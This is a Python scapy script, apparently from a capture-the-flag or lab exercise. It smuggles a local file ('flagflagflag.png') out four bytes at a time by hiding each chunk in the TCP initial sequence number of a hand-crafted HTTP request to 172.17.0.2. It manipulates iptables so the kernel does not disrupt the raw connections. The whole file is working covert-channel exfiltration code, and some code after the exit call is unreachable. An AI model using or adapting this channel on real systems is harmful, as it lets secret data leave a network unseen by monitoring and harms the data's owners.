from socket import timeout
from scapy.all import *
import random
import os
import time


seq = random.randint(0,2**32-1)
dst_ip="172.17.0.2"
DPORT = 80
SECRET_FILE_NAME="flagflagflag.png"
conf.verb=False
def setup(dport, sport):
    # Drop incoming packets on port 12345
    os.system(f"sudo iptables -A INPUT -p tcp --dport {dport} -j DROP")
    # Drop outgoing packets on port 12345
    os.system(f"sudo iptables -A OUTPUT -p tcp --sport {sport} -j DROP")
def cleanup(dport, sport):
    # Delete the rule from the INPUT chain
    os.system(f"sudo iptables -D INPUT -p tcp --dport {dport} -j DROP")
    # Delete the rule from the OUTPUT chain
    os.system(f"sudo iptables -D OUTPUT -p tcp --sport {sport} -j DROP")


sports_to_cleanup = []

#setup(DPORT, SPORT)
def make_simple_http_req(initial_seq_num, SPORT = None, dst_ip = dst_ip, DPORT = DPORT):
    message = f"\
GET /flag.txt HTTP/1.1\r\n\
Host: {dst_ip}:{DPORT}\r\n\
User-Agent: curl/8.10.1\r\n\
Accept: */*\n\r\n\r"

    seq = initial_seq_num
    response_str=b""
    sport = SPORT if SPORT is not None else random.randint(1024, 2**16-1)
    while sport in sports_to_cleanup:
        sport = random.randint(1024, 2**16-1)

    setup(DPORT, sport)
    syn_resp,=sr1(IP(src=conf.iface.ip, dst=dst_ip)/TCP(seq=seq, ack=0, dport=DPORT, sport=sport, flags="S"))
    seq += 1
    ack = syn_resp[TCP].seq + 1
    
    
    #we dont expect a response
    send(IP(src=conf.iface.ip, dst=dst_ip)/TCP(seq=seq, ack=ack, dport=DPORT, sport=sport, flags="A"))
    
    
    resp,=sr1(IP(src=conf.iface.ip, dst=dst_ip)/TCP(seq=seq, ack=ack, dport=DPORT, sport=sport, flags="AP")/message)
    seq += len(message)
    try:
        ack += len(resp.load)
        send(IP(src=conf.iface.ip, dst=dst_ip)/TCP(seq=seq, ack=ack, dport=DPORT, sport=sport, flags="A"))
        #response_str += resp.load
        print(f"[UNEXPECTED] len of resp is {len(resp.load)}")
    except AttributeError:
        pass
    
    
    while "F" not in resp[TCP].flags and "R" not in resp[TCP].flags:
        #print(f"continue?: {"F" not in resp[TCP].flags and "R" not in resp[TCP].flags}")
        #resp,=sr1(IP(src=conf.iface.ip, dst=dst_ip)/TCP(seq=seq, ack=ack, dport=DPORT, sport=sport, flags="A"))

        #we are waiting for the http response
        resp = sniff(iface = "docker0", lfilter = lambda p : TCP in p and p[TCP].dport == sport and p[TCP].sport == DPORT, count = 1)[0]

        try:
            ack += len(resp.load)
            send(IP(src=conf.iface.ip, dst=dst_ip)/TCP(seq=seq, ack=ack, dport=DPORT, sport=sport, flags="A"))
            #response_str += resp[TCP].load
            print(f"len of resp is {len(resp.load)}")
        except AttributeError:
            pass
        
    ack += 1
    send(IP(src=conf.iface.ip, dst=dst_ip)/TCP(seq=seq, ack=ack, dport=DPORT, sport=sport, flags="A"))
    resp,=sr1(IP(src=conf.iface.ip, dst=dst_ip)/TCP(seq=seq, ack=ack, dport=DPORT, sport=sport, flags="FA"))
    seq += 1
    try:
        ack += len(resp.load)
        send(IP(src=conf.iface.ip, dst=dst_ip)/TCP(seq=seq, ack=ack, dport=DPORT, sport=sport, flags="A"))
    except:
        pass

    while 'F' in resp.flags:
        resp,=sr1(IP(src=conf.iface.ip, dst=dst_ip)/TCP(seq=seq, ack=ack, dport=DPORT, sport=sport, flags="A"), timeout = 1)


    sports_to_cleanup.append(sport)
    #return response_str

if __name__ == "__main__":

    secret= bytearray(
        open(SECRET_FILE_NAME, "rb").read()
    )
    #if len(secret) % 4 != 0:
    #    pad_bytes = 4 - (len(secret) % 4)
    #    secret += b"\0" * pad_bytes
    #    print(f"padded {pad_bytes} times : {len(secret)}")
    print(f"will take {len(secret)/4} requests")
    secret_index = 0
    while secret_index < len(secret):
        end_index = secret_index + 4
        if end_index > len(secret):
            end_index = len(secret)

        print(f"{secret_index}/{len(secret)}")
        isn = int.from_bytes(
            secret[secret_index : end_index ]
        )
        if end_index == len(secret) and (isn & 0xff000000) == 0:
            isn = isn << 8 #this messed up with the file transfer once cuz the 0 was behind the isn, like 00 ff ab 0a instead of ff ab 0a 00

        print(f"{isn:x}, {secret[secret_index : end_index ]}")

        resp = make_simple_http_req(isn)
        #print(resp)
        secret_index += 4
        isn = 0

    for sport in sports_to_cleanup:
        cleanup(DPORT, sport)
    exit(0)
    
    print(f"{secret_index}/{len(secret)}")

    isn = int.from_bytes(
        secret[secret_index : secret_index+4]
    )
    #for i in range(secret_index, secret_index+4):
    #    isn += ord(secret[i]) << (secret_index + 3 - i) * 8
    print(f"{isn:x}, {secret[secret_index : secret_index+4]}")
    resp=make_simple_http_req(isn)
    #print(resp)
    secret_index += 4
    isn = 0

   #cleanup(DPORT, SPORT)
